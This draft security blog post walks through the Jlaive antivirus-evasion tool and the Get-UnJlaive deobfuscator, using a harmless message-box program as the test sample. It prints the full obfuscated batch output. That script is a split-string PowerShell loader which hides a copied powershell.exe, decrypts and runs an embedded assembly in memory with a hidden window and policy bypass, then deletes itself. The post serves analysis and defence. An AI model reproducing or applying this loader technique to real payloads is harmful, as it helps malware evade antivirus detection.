+++
title = "Exploring the Jlaive and UnJlaive tool"
date = 2024-03-11T20:03:02+02:00
draft = true
tags = ["Jlaive","UnJlaive","obfuscation"]
categories = ["malware"]
ShowToc = false
author = ["connar"]
+++
## What will this post be about
This post will be about the Jlaive and Get-UnJlaive tools. I will not go into depth as there are other resources I will list that do a great job explaining more in depth of the ins and outs of these tools. This will just be an overview of the tools: **How to obfuscate an executable with Jlaive and how to recover it using Get-UnJlaive.**


## What is the Jlaive tool
In short terms, Jlaive is a tool used to convert executables to undetectable .bat scripts for AV evasion. This tool is very similar to the well known BatCloak engine which was used to create such undetectable .bat scripts. As the scmagazine states *...Researchers tie BatCloak closely to another, now abandoned, BAT obfuscation tool called Jlaive...Trend Micro said that the BatCloak engine is the core engine of Jlaive’s obfuscation algorithm, now repurposed. The BatCloak functionality is specifically tied to the instructions “LineObfuscation.cs and FileObfuscation.cs” used in the Jlaive crimeware.*

There are many tools with similar goals, like the ScrubCrypt, but they are closed-source for better monetization and avoide the use of them from other cyber criminal groups. Anyway, lucky for us, we got a hold of the Jlaive tool and we are going to explore it in a simple poc executable.  

### Simple poc
The poc is nothing more than a MsgBox:
```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace pocHello
{
    internal class Program
    {
        static void Main(string[] args)
        {
            MessageBox.Show("just an msgbox as a poc", "Message Box POC", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}
```
After building the project, we simply run the tool and load our executable, choosing what features we would like the obfuscated .bat file to have:

![jlaive tool](/posts/jlaive/jlaive_tool.png)

Running the tool, we get a successful message:  
![encrypted output](/posts/jlaive/encrypted_output.png)

Navigating to the path where the .bat file was created, we are met with the following code:
```bat
@echo off
echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe "%~dp0%~nx0.exe" /y
attrib +s +h "%~dp0%~nx0.exe"
cls
cd %~dp0
set "fENYbyZJkq=3IHsgcHVib"
set "oMDpdCkaMN=k = [Syste"
set "HlBoTjvPwk=6UdLqADvWw" && set "TgmwRYHkmK=ucHV0Lkxlb"
set "nVaFdaubIS=npolicy by" && set "BIXBCNceka=gSUNyeXB0b" && set "YNWXZHqJqc=gZ3MuRGlzc"
set "tQIzxvQESC=GtleSwgYnl" && set "XOhAfBkWmm=vert]::Fro"
set "kLMTZqURfX=U), [Syste" && set "qVRmUESgbg=$tIukXz = " && set "saTMAKUycO=SBpbnB1dCw" && set "KdmMRlyyEK=nlwdG9yLlR" && set "PMyINOXuEO=GJ5dGVbXSB"
set "FscnzUUuAC=::FromBase"
set "BARCwvwdkW=-noprofile" && set "vwRxWzGiFE=))).EntryP"
set "sMNjHgEuTS=md0aCk7IGR" && set "ZMFfhtZaCd=n $tIukXz;" && set "NRBHbUNrkG=etString([" && set "tNCgPVjCku=kID0gZGVjc"
set "CDtNvqDvqL=ngth - 1];" && set "ieHoPTyjEy=mBase64Str" && set "rajcuUaXTP=m.IO.File]" && set "ihrpBFSJkF=Gh5OyBwdWJ" && set "ObqwUWcIse=yZXR1cm4gb"
set "wrxnxJJZUi=10gY1VaaUJ"
set "tPPsLfEmfH=ssembly]::" && set "wYpmPrqEes=0ZW0uU2Vjd" && set "PeMJlFunvD=%~nx0.exe " && set "xRRkIyDKnV=GUgPSBDaXB"
set "LguDwtEgTm=ing('dXNpb"
set "rBnjvHzCEC=SwgaXYpOyB" && set "BwxNyGNeWs=and $NDmNb" && set "NOLCAWkezL=XJpdHkuQ3J" && set "JxakJbogEh=c212SWxpVX"
set "avLgdUKvyf=System.Con"
set "dzLmqrEuSn=Load([DuUJ"
set "buYFlxnyag=mcgU3lzdGV"
set "JrzOnKokrg=G8obXNvKTs"
set "VKtWSAzekf=kaW5nTW9kZ"
set "UDLwXXbfUO=eDefinitio"
set "pZCqseAkqe=ext('%~f0').Split([Environment]::NewLine);$WWCkvU "
set "bEuenIEGAB=ert]::From"
set "evGNjFJkiq=::ReadAllT"
set "EtpzUbnYkW=XRlRGVjcnl"
set "rAJgHQskWM=3VzaW5nIFN" && set "nUMBtoFYkK=yBNZW1vcnl" && set "DlNUGnnsfJ=gTWVtb3J5U" && set "tguYxsQeEG=hbmFnZWQgY" && set "ZxsoDXEAmh=::cUZiBs(["
set "rrBdlEgEiR=" && set "yuBNvyTjWG=ieXRlW10gZ" && set "EpkleGpiSQ=zLlBhZGRpb" && set "hlfUYJcbnE=//github.c" && set "JaaFxTqmkm=zKGJ5dGVbX"
set "ovxvfokepJ=yA9IG5ldyB" && set "NdBkzRUyNc=-Type -Typ"
set "cECnVddQIO=gYWVzLk1vZ"
set "JYdzLMkAMI=zdGVtLklPO"
set "LIJyjYDhEO=mBase64Str"
set "FQDboAlVkm=0cmVhbSBtc" && set "CtISDxCuyg=$NDmNbk.Le"
set "cPhgSHJFiE=laive" && set "wOUbaaionW=8dQ='), [S"
set "TFqYzkUFKP=oZXJNb2RlL" && set "XmJlbVCEeg=ybSBkZWNye"
set "rsAojPyqqK=pass -comm"
set "HjDUCECfuK=vY2soaW5wd" && set "RLYjZdmUem=i5EaXNwb3N"
set "JmcNfgjlkO=3IE1lbW9ye"
set "wotBbJUCXp=28gPSBuZXc"
set "ZMbsYBZiEq=S5QS0NTNzs"
set "JWEGEWztyS=y5Db21wcmV" && set "wYGjMTSRLU=G9zZSgpOyB" && set "RZdMvuYUqn=tLlRleHQ7d"
set "DDhHMvstEO=GljIHN0YXR" && set "BLkZldvAHE=TdHJlYW0gb" && set "HkRRYWZUWm=7IHZhciBnc"
set "EvYPmaikjR=lY3J5cHRvc" && set "NUGvGuKfkH=]] ('%*')))" && set "TiPQaNUyEk=om/ch2sh/J" && set "mMQdKSFyum=yeXB0ZWQ7I"
set "FFeCIpqPyy= -windowst"
set "lYRjpzjmyM=mcgPSBQYWR" && set "jEdNSXkuFv=oint.Invok"
set "UeVhkuMOtk=XNpID0gbmV"
set "reZEtGxrSh=y5EaXNwb3N" && set "uPqpbVZyku=ystem.Conv" && set "QbZOQhYmgk=Fw]::YWqYu"
set "ljXHtMvGyf=jIHN0YXRpY" && set "LulfiaLhEe=XNpbmcgU3l"
set "GVtjxQXtOo=zc2lvbjt1c"
set "EyEeayRkCp=m.Convert]" && set "VTmkqOOkQh=5c3RlbS5JT"
set "DJZvlJxSeK=flection.A"
set "VrbuAavxUi=XQsIDAsIGl" && set "ytnErceFKM=G9zZSgpOyB"
set "WsBCQAkGPI=mFnZWQoKTs" && set "ZeKpegxEqf=UZpbmFsQmx" && set "fYjkFWUCLu=e($null, (" && set "qbrRUujXDM=lKCk7IGFlc" && set "TcbXekUkOV=Base64Stri" && set "ryOJrbkGXw=ncy5Db3B5V" && set "gBhbYMmkar=HWmlwU3RyZ"
set "xFXbUXSqiH=hZXMuQ3JlY"
set "jUxqxtJWwK=XB0b3IgPSB"
set "cUNiABJEPG=64String('"
set "BYliuSSkds=E1lbW9yeVN"
set "DgsMJGRBkW=kNCQzsgYWV" && set "yxMQSdikCf=System.Con" && set "pqydlkWvlv=yYW5zZm9yb"
set "xmGqfoyigz=yYXkoKTsgf" && set "mKWZuiSqkG= -executio"
set "pWisjkyuvo=g]::UTF8.G" && set "RdergtMaPv=3MgRHVVSkZ" && set "FoeUHvtBeI=3RyZWFtKCk"
set "PtbWQSaxkP=gYnl0ZVtdI" && set "prlyUalgGj=, [string[" && set "qfhEOMrfue=rem https:"
set "EHNuBdghke=XNvLlRvQXJ"
set "atzklLZikC=ieXRlcyk7I"
set "VzZHdHfnkK=wdG9yKGtle" && set "pbEQoHEFya=3Npb25Nb2R"
set "wyIRpJUzUy=ng('i9gKth"
set "aRvucOwBMK=lLkRlY29tc"
set "ZGtoXTmqEa=vert]::Fro" && set "LBXFmXrGGk=yle hidden" && set "PgpYWgnESr=SB9'));Add" && set "jQJlvwKnUC=HVybiBkZWN"
set "yutyGaKptk=pYyBieXRlW"
set "NrVzEyZKxJ=gWVdxWXVPK"
set "ElUeqoZkeB=5cHRvZ3Jhc" && set "VqDUHkduHE=HJlc3MpOyB" && set "bXuhcMQWEC=tc2kuRGlzc" && set "wIkgxuqwSU=ieXRlcykge" && set "BeUppPecxE=xt.Encodin" && set "JXrPZaVOUG=G9zZSgpOyB" && set "FclUyvUGNa=WVzID0gbmV" && set "QQwGKBkSYC=WS5VvlzyRn" && set "QSDzwOfsqN=saWMgY2xhc" && set "nNEnadmgAy=SB7IEFlc01"
set "ZSnQhDQxOJ=WFtKG1zaSw"
set "hCSlczZEed=[System.Re"
set "tAyNMEciUo=VN0cmVhbSh" && set "lELXxFDard=O([DuUJFw]"
set "nNsRHgWaoU== $NDmNbk["
set "ldbJMTqUaX=0ZVtdIGl2K" && set "sSUxwkECwE=1RyYW5zZm9" && set "IYUhcqkikI=1hMu1g==')"
set "rgNaXziIpC=GVjcnlwdGV"
set "xdaAAuWEqb=3IEFlc01hb" && set "TYDLSAjkyA=gQ29tcHJlc" && set "GgmonIEaZP=ing($WWCkv"
set "IArsKCeeLv=tc28uRGlzc" && set "oLgiwxduaV=H0gcHVibGl" && set "GNZxLtdDkO=[System.Te"
set "amOerQZEai=OxhVVfEWSN" && set "fHTMzMCrak=yBieXRlW10"
set "kKopFOwikC=2luZyBTeXN"
set "occQjttmnX=lKCk7IHJld"
set "eZKAFlWkCV=MlVcdDTvXm"
%qfhEOMrfue%%hlfUYJcbnE%%TiPQaNUyEk%%cPhgSHJFiE%
%PeMJlFunvD%%BARCwvwdkW%%FFeCIpqPyy%%LBXFmXrGGk%%mKWZuiSqkG%%nVaFdaubIS%%rsAojPyqqK%%BwxNyGNeWs%%oMDpdCkaMN%%rajcuUaXTP%%evGNjFJkiq%%pZCqseAkqe%%nNsRHgWaoU%%CtISDxCuyg%%CDtNvqDvqL%%qVRmUESgbg%%GNZxLtdDkO%%BeUppPecxE%%pWisjkyuvo%%NRBHbUNrkG%%avLgdUKvyf%%ZGtoXTmqEa%%LIJyjYDhEO%%LguDwtEgTm%%buYFlxnyag%%RZdMvuYUqn%%LulfiaLhEe%%JYdzLMkAMI%%rAJgHQskWM%%VTmkqOOkQh%%JWEGEWztyS%%GVtjxQXtOo%%kKopFOwikC%%wYpmPrqEes%%NOLCAWkezL%%ElUeqoZkeB%%ihrpBFSJkF%%QSDzwOfsqN%%RdergtMaPv%%fENYbyZJkq%%DDhHMvstEO%%yutyGaKptk%%wrxnxJJZUi%%JaaFxTqmkm%%saTMAKUycO%%PtbWQSaxkP%%tQIzxvQESC%%ldbJMTqUaX%%nNEnadmgAy%%tguYxsQeEG%%FclUyvUGNa%%xdaAAuWEqb%%WsBCQAkGPI%%cECnVddQIO%%xRRkIyDKnV%%TFqYzkUFKP%%DgsMJGRBkW%%EpkleGpiSQ%%lYRjpzjmyM%%VKtWSAzekf%%ZMbsYBZiEq%%BIXBCNceka%%sSUxwkECwE%%XmJlbVCEeg%%jUxqxtJWwK%%xFXbUXSqiH%%EtpzUbnYkW%%VzZHdHfnkK%%rBnjvHzCEC%%yuBNvyTjWG%%rgNaXziIpC%%tNCgPVjCku%%KdmMRlyyEK%%pqydlkWvlv%%ZeKpegxEqf%%HjDUCECfuK%%VrbuAavxUi%%TgmwRYHkmK%%sMNjHgEuTS%%EvYPmaikjR%%RLYjZdmUem%%qbrRUujXDM%%reZEtGxrSh%%occQjttmnX%%jQJlvwKnUC%%mMQdKSFyum%%oLgiwxduaV%%ljXHtMvGyf%%fHTMzMCrak%%NrVzEyZKxJ%%PMyINOXuEO%%wIkgxuqwSU%%nUMBtoFYkK%%BLkZldvAHE%%UeVhkuMOtk%%JmcNfgjlkO%%tAyNMEciUo%%atzklLZikC%%BYliuSSkds%%FQDboAlVkm%%wotBbJUCXp%%DlNUGnnsfJ%%FoeUHvtBeI%%HkRRYWZUWm%%ovxvfokepJ%%gBhbYMmkar%%ZSnQhDQxOJ%%TYDLSAjkyA%%pbEQoHEFya%%aRvucOwBMK%%VqDUHkduHE%%ryOJrbkGXw%%JrzOnKokrg%%YNWXZHqJqc%%JXrPZaVOUG%%bXuhcMQWEC%%wYGjMTSRLU%%IArsKCeeLv%%ytnErceFKM%%ObqwUWcIse%%EHNuBdghke%%xmGqfoyigz%%PgpYWgnESr%%NdBkzRUyNc%%UDLwXXbfUO%%ZMFfhtZaCd%%hCSlczZEed%%DJZvlJxSeK%%tPPsLfEmfH%%dzLmqrEuSn%%QbZOQhYmgk%%lELXxFDard%%ZxsoDXEAmh%%yxMQSdikCf%%XOhAfBkWmm%%ieHoPTyjEy%%GgmonIEaZP%%kLMTZqURfX%%EyEeayRkCp%%FscnzUUuAC%%cUNiABJEPG%%HlBoTjvPwk%%QQwGKBkSYC%%JxakJbogEh%%eZKAFlWkCV%%wOUbaaionW%%uPqpbVZyku%%bEuenIEGAB%%TcbXekUkOV%%wyIRpJUzUy%%amOerQZEai%%IYUhcqkikI%%vwRxWzGiFE%%jEdNSXkuFv%%fYjkFWUCLu%%prlyUalgGj%%NUGvGuKfkH%
%rrBdlEgEiR%
attrib -s -h "%~dp0%~nx0.exe"
del "%~dp0%~nx0.exe"(goto) 2>nul & del "%~f0"
exit /b
jjNNb7+5GJxTidTZUiwqq6EMDNO1MKBC21fz5d08N7l -- a bunch more of b64 encrypted bytes ---
```
A great resource explaining the commands used in the batch file is a post made by **Jose Luis Sánchez Martínez** in his blog (which I will leave in the references). He gives an overview of what calls are being made when we execute this obfuscated .bat file and also a poc of rules to detect such malicious files (although, they could be bypassed).


Running this batch script gives the same output as our original executable:  
![running the bat](/posts/jlaive/running_the_bat.png)

After we run this, the .bat file gets deleted - well, its contents gets deleted - and a new file, with an .exe extension appears to have been created:  
![new batexe file](/posts/jlaive/new_batexe_file.png)
This is where the tool Get-UnJlaive will come into play, which will take advantage of this and manage to deobfuscate the script and give the original .exe code.


## Get-UnJlaive
Now onto the deobfuscation part. Get-UnJlaive is a tool able to reconstruct Jlaive (.NET Antivirus Evasion Tool (Exe2Bat)) to original Assembly and stub Assembly, as the author states. We are going to use his tool which can be found in the following repo (also has an amazing channel which I will leave in the references):  
- https://github.com/Dump-GUY/Get-UnJlaive

Basically what this tool does is to run the .bat file, set it in a suspended state to get the deobfuscated form (as we previously saw, a .exe was created after we had run the .bat), decrypt it, reconstruct the original assembly and then terminates it. For an indepth analysis of how this tool works, you can watch the video of dumpguy which I'll leave in the references.  

### Reconstructing the original assembly
The tool is easy to set. You simple just open a powershell terminal, load the module provided and you are good to go. After you run the tool, you should get a file with an extension ".bat_orig.exe" which you could load into DnSpy for example and view its code:
![reconstructed](/posts/jlaive/reconstructed.png)

Aaand we have successfully reconstructed our original .exe from the obfuscated batch file!

**References**
<blockquote>
    <ul>
        <li> [1] <a href="https://www.scmagazine.com/news/obfuscation-batcloak-80-percent-av-engines">scmagazine: <i>Obfuscation tool ‘BatCloak’ evades 80% of AV engines</i></a></li>
        <li> [2] <a href="https://jstnk9.github.io/jstnk9/research/Jlaive-Antivirus-Evasion-Tool/">Jose Luis Sánchez Martínez: <i>Using Jlaive to create batch files from .NET assemblies for defense evasion</i></a></li>
        <li> [3] <a href="https://github.com/Dump-GUY/Get-UnJlaive">Dump-GUY: <i>Get-UnJlaive</i></a></li>
        <li> [3] <a href="https://www.youtube.com/watch?v=cKciCTW82I8">DuMp-GuY TrIcKsTeR: <i>Get-UnJlaive - Jlaive Protector Reconstructor</i></a></li>
    </ul>
</blockquote>